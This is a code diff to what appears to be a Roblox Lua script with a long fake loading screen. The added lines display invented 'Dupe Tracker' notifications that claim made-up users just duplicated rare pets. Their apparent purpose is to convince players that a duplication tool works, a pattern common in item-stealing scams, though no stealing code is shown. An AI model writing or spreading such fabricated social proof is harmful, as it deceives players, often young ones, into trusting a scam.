@@ -99,6 +99,38 @@ percent.ZIndex = 2
 percent.Parent = loadingGui
 TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 0}):Play()
 
+local notifications = {
+    "{user} just duped Raccoon x2",
+    "{user} duplicated Queen Bee x1",
+    "{user} triggered Disco Bee x3 dupe",
+    "{user} Just Duped 3x Mimic Octopus",
+    "{user} duplicated Dragonfly x2",
+    "{user} duplicated Butterfly x5",
+    "{user} used Red Fox x3 in dupe"
+}
+
+local usernames = {
+    "ProfessorXQueen", "Faze_sv3n1", "huge_collector202", "Yey012733",
+    "Giantmonstervinnie3", "Junior7770m", "sucaboy202829", "Elliot3229",
+    "stankybahlz", "LilRavioliiii", "Aquaz_233", "Velvethop66", "Ravage91101"
+}
+
+-- Start sending random notifications during loading
+task.spawn(function()
+    for i = 1, 20 do
+        task.wait(math.random(12, 25)) -- every 12–25 seconds
+        local user = usernames[math.random(#usernames)]
+        local msg = notifications[math.random(#notifications)]:gsub("{user}", user)
+        pcall(function()
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "Dupe Tracker",
+                Text = msg,
+                Duration = 5
+            })
+        end)
+    end
+end)
+
 -- 🔁 Animate Loading (10 minutes)
 local duration = 600 -- 10 minutes
 local steps = 100
